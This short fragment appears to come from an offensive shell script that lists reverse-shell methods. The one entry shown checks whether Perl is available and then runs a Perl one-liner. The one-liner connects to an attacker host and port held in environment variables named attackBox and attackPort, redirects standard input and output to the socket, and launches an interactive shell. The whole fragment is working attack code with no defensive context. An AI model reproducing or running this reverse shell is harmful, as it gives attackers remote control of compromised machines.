...
methods=(
	...
	"perl , if perl -e \"use Socket;\" , perl -e 'use Socket;$i=\"$ENV{attackBox}\";$p=$ENV{attackPort};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"$SHELL -i\");};'" 
